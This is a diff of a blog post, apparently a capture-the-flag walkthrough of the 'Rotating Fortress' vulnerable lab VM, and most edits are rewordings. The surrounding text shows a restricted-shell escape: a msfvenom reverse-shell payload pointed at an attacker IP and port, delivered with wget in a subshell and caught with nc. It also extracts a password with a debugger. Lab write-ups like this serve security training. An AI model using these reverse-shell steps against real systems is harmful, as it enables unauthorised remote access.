@@ -1,7 +1,7 @@
 ---
 layout: post
 date: 2018-08-15 07:37:27 +0000
-last_modified_at: 2018-08-16 10:50:40 +0000
+last_modified_at: 2018-08-16 16:03:15 +0000
 title: "Rotating Fortress: 1.0.1 Walkthrough"
 subtitle: "I'm Spinning Around"
 category: Walkthrough
@@ -74,7 +74,7 @@ This brings us to the next stage.
 
 To be honest, the page was giving a lot of Mandarin's Lessons vibe in Iron Man 3. I got petrified for a while. I didn't know what to think until hours later. :laughing:
 
-I did my best to determine the directories and files starting at this level. This is what I find.
+I did my best to determine the directories and files at this level. This is what I found.
 
 + `/resources` has directory indexing
 + `/icons` has directory indexing
@@ -102,7 +102,7 @@ Apparently not, but look what happens when you supply `backd00r_pass123` as the 
 
 ![GDB](/assets/images/posts/rotating-fortress-1.0.1-walkthrough/adb17656.png)
 
-Internally, the program is comparing `backd00r_pass123` with `xBspsiONMSNXeVuiomF`.
+The program is comparing `backd00r_pass123` with `xBspsiONMSNXeVuiomF`.
 
 I think I've seen enough. Let's quit the debugger and enter `xBspsiONMSNXeVuiomF` as the password.
 
@@ -132,7 +132,7 @@ echo
 echo "-----"
 ```
 
-Since we don't know the key (hey, I don't read Martian), let's loop the script through 1 to 99 for each message.
+Since we don't know the key (I don't read Martian you know), let's loop the script through key 1 to 99 for each message.
 
 _Message 1. The key is 52 or 84._
 
@@ -253,7 +253,7 @@ OK. Let's go to `/chat.php`.
 
 ![chat.php](/assets/images/posts/rotating-fortress-1.0.1-walkthrough/4c88b34b.png)
 
-The chat page is more of a distraction than anything useful, while the **Download** button, allows you to download `/papa_legba.zip`. The archive contains the following files.
+The chat page is more of a distraction than anything useful, meanwhile the **Download** button, allows you to download `/papa_legba.zip`. The archive contains the following files.
 
 ```
 # unzip -l papa_legba.zip
@@ -466,9 +466,9 @@ Let's enter the flags we have so far.
 
 ![One-Way Shell](/assets/images/posts/rotating-fortress-1.0.1-walkthrough/5796446b.png)
 
-Zeus' 1-way shell has a weakness—it allows the use of subshell. To bypass the restricted 1-way shell, I'm transferring a reverse shell over to `/tmp/rev` with `wget` running in a subshell. Over at my machine, I'm hosting a reverse shell (generated with `msfvenom`) with Python **SimpleHTTPServer** module.
+The **ZEUS' 1-WAY SHELL** has a weakness—it allows the use of subshell. To bypass the restricted it, I transferred a reverse shell over to `/tmp/rev` with `wget` running in the subshell. Over at my machine, I hosted a reverse shell (generated with `msfvenom`) with the Python **SimpleHTTPServer** module. Here's what I did.
 
-On my machine, I use the following `msfvenom` options to generate the reverse shell.
+First, I use the following `msfvenom` options to generate the reverse shell on my machine.
 
 ```
 # msfvenom -p linux/x64/shell_reverse_tcp LHOST=192.168.30.128 LPORT=4444 --platform linux -a x64 -f elf -o rev
@@ -478,21 +478,19 @@ Final size of elf file: 194 bytes
 Saved as: rev
 ```
 
-_Here, I'm executing `wget` in a subshell._
+_The image below shows the execution of `wget` in a subshell._
 
 ![wget](/assets/images/posts/rotating-fortress-1.0.1-walkthrough/9f483d07.png)
 
-_The `wget` is successful._
+_The image below shows that `wget` was successful._
 
 ![SimpleHTTServer](/assets/images/posts/rotating-fortress-1.0.1-walkthrough/464e989a.png)
 
-Let's get ourselves a proper shell.
-
-_Here, I'm making `rev` executable._
+_The image below shows the command to make `rev` executable, and the execution of `rev`._
 
 ![chmod +x](/assets/images/posts/rotating-fortress-1.0.1-walkthrough/1e11d8ed.png)
 
-_Caught the reverse shell, and spawning a proper shell._
+_The image below shows the reverse shell caught by `nc`, and the command to spawn a proper shell._
 
 ![Reverse Shell](/assets/images/posts/rotating-fortress-1.0.1-walkthrough/78dd1c75.png)
 
